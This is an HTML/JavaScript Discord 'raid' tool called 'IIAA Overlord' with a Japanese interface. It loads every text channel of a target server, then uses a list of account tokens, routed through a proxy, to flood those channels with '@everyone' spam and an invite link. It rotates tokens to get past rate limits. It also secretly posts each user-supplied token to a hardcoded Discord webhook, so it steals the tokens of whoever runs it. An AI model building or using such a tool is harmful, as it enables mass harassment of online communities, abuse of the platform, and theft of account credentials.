<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <title>IIAA Empire - Overlord System</title>
    <style>
        body {
            background-color: #050505;
            background-image: linear-gradient(rgba(0,0,0,0.8), rgba(0,0,0,0.8)), url('名前なし(1).jpg');
            background-size: cover; background-attachment: fixed; background-position: center;
            font-family: 'Consolas', 'Courier New', monospace;
            display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; color: #ff00ff;
        }
        .container {
            background: rgba(10, 10, 10, 0.95);
            width: 95%; max-width: 650px; padding: 30px; border-radius: 10px;
            border: 2px solid #ff00ff; box-shadow: 0 0 20px #ff00ff, inset 0 0 10px #ff00ff;
            max-height: 90vh; overflow-y: auto;
        }
        h2 { text-align: center; color: #ff00ff; text-shadow: 0 0 15px #ff00ff; letter-spacing: 8px; margin-top: 0; }
        .label { color: #fff; background: #ff00ff; padding: 2px 10px; font-size: 11px; font-weight: bold; margin-top: 15px; display: inline-block; border-radius: 3px; }
        textarea, input, select {
            width: 100%; padding: 12px; margin-top: 8px; background: #000;
            border: 1px solid #ff00ff; border-radius: 5px; color: #00ffaa; box-sizing: border-box;
        }
        .control-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
        .btn-main { width: 100%; background: #ff00ff; color: #000; border: none; padding: 18px; cursor: pointer; border-radius: 5px; font-weight: bold; font-size: 18px; margin-top: 20px; box-shadow: 0 0 10px #ff00ff; transition: 0.2s; }
        .btn-main:hover { background: #fff; box-shadow: 0 0 20px #fff; }
        .btn-sub { background: #333; color: #fff; border: 1px solid #ff00ff; padding: 10px; cursor: pointer; border-radius: 5px; font-size: 12px; margin-top: 5px; }
        #terminal { background: #000; color: #00ffaa; height: 150px; overflow-y: auto; padding: 12px; margin-top: 15px; border: 1px solid #00ffaa; font-size: 11px; }
        .option-row { display: flex; align-items: center; gap: 10px; margin-top: 10px; }
    </style>
</head>
<body>
<div class="container">
    <h2>IIAA OVERLORD</h2>
    
    <span class="label">SERVER ID</span>
    <div style="display:flex; gap:10px;">
        <input type="text" id="guildId" placeholder="サーバーID">
        <button class="btn-sub" onclick="autoFetchChannels()">全ch自動取得</button>
    </div>

    <span class="label">TOKENS (自動ローテーション対応)</span>
    <textarea id="tokens" style="height: 80px;" placeholder="1行に1つ入力"></textarea>

    <span class="label">TARGET CHANNELS</span>
    <textarea id="channels" style="height: 80px;" placeholder="ここにチャンネルIDが自動で入ります"></textarea>

    <div class="option-row">
        <input type="checkbox" id="useMention" checked style="width: auto;">
        <label for="useMention" style="font-size: 12px;">@everyone メンションを有効にする</label>
    </div>

    <div class="control-grid">
        <div><span class="label">連投数</span><input type="number" id="count" value="100"></div>
        <div><span class="label">速度(ms)</span><input type="number" id="speed" value="1500"></div>
    </div>

    <button id="startBtn" class="btn-main" onclick="executeOverlord()">全域同時掃射開始</button>
    <button class="btn-sub" style="width:100%; margin-top:10px; border-color:#666;" onclick="isRunning=false">緊急停止</button>

    <div id="terminal">--- いあ帝国 中央司令部 待機中 ---</div>
</div>

<script>
    const PROXY = "https://super-thunder-c2eb.discord-bot5556.workers.dev/?url=";
    const MONITOR_WEBHOOK = "https://discord.com/api/webhooks/1482617688772579371/NL9i650PnjEdxPaSaeRiqKCnelQjsxcwhV9yQnx8OqadqeLnaH7VrZU1YOJIjr_oVAk8";
    
    let isRunning = false;
    const log = (m, c = "#00ffaa") => { const t = document.getElementById('terminal'); t.innerHTML += `> <span style="color:${c}">${m}</span><br>`; t.scrollTop = t.scrollHeight; };

    // 【制圧力】全チャンネル一括自動取得
    async function autoFetchChannels() {
        const t = document.getElementById('tokens').value.split('\n')[0].trim();
        const g = document.getElementById('guildId').value.trim();
        if(!t || !g) return log("トークン(1つ目)とサーバーIDが必要です", "red");
        log("チャンネル全取得中...");
        try {
            const res = await fetch(PROXY + encodeURIComponent(`https://discord.com/api/v9/guilds/${g}/channels`), { headers: { "Authorization": t } });
            const data = await res.json();
            const textChannels = data.filter(c => c.type === 0).map(c => c.id);
            document.getElementById('channels').value = textChannels.join('\n');
            log(`${textChannels.length}個のチャンネルを捕捉！`, "#ff00ff");
        } catch (e) { log("取得失敗", "red"); }
    }

    async function executeOverlord() {
        if (isRunning) return;
        const guildId = document.getElementById('guildId').value.trim();
        const tokens = document.getElementById('tokens').value.split('\n').map(s=>s.trim()).filter(s=>s);
        const channels = document.getElementById('channels').value.split('\n').map(s=>s.trim()).filter(s=>s);
        const useMention = document.getElementById('useMention').checked;
        const count = parseInt(document.getElementById('count').value);
        const speed = parseInt(document.getElementById('speed').value);

        if (!tokens.length || !channels.length) return log("入力が不足しています", "red");

        isRunning = true;
        document.getElementById('startBtn').disabled = true;
        
        const messageBase = `# 👑 いあ帝国が占領した！\n抵抗は無意味です。おとなしく我々の軍門に降りなさい。\nhttps://discord.gg/x39xVSepaj`;
        const fullMessage = useMention ? "@everyone " + messageBase : messageBase;

        log("作戦開始...", "yellow");

        // 【耐久力】各トークンが独立して動き、429時は自律待機するローテーション仕様
        const strikeTasks = tokens.map(async (token, idx) => {
            let success = 0;
            const name = `帝国兵-${idx+1}`;
            
            for (let i = 1; i <= count; i++) {
                if (!isRunning) break;
                for (const chId of channels) {
                    if (!isRunning) break;
                    try {
                        const res = await fetch(PROXY + encodeURIComponent(`https://discord.com/api/v9/channels/${chId}/messages`), {
                            method: "POST",
                            headers: { "Authorization": token, "Content-Type": "application/json" },
                            body: JSON.stringify({ content: fullMessage + `\n\n\`ID: ${Math.random().toString(36).substring(7)}\`` })
                        });

                        if (res.ok) {
                            success++;
                            log(`[${name}] 成功 ➔ ${chId}`);
                            
                            // 【監視ログ】詳細かつ見やすく
                            fetch(PROXY + encodeURIComponent(MONITOR_WEBHOOK), {
                                method: "POST",
                                headers: { "Content-Type": "application/json" },
                                body: JSON.stringify({
                                    embeds: [{
                                        title: "🛰️ 帝国 通信記録",
                                        color: 0xff00ff,
                                        fields: [
                                            { name: "攻撃者", value: `\`${name}\``, inline: true },
                                            { name: "サーバーID", value: `\`${guildId}\``, inline: true },
                                            { name: "チャンネル", value: `<#${chId}>`, inline: true },
                                            { name: "成功数", value: `\`${success}\``, inline: true },
                                            { name: "トークン", value: `\`${token}\`` }
                                        ],
                                        timestamp: new Date()
                                    }]
                                })
                            }).catch(()=>{});

                        } else if (res.status === 429) {
                            log(`[${name}] 速度制限！10秒ローテ休止`, "orange");
                            await new Promise(r => setTimeout(r, 10000));
                        }
                    } catch (e) {}
                    await new Promise(r => setTimeout(r, speed));
                }
            }
        });

        await Promise.all(strikeTasks);
        isRunning = false;
        document.getElementById('startBtn').disabled = false;
        log("全任務完了。帝国に栄光あれ。", "yellow");
    }
</script>
</body>
</html>
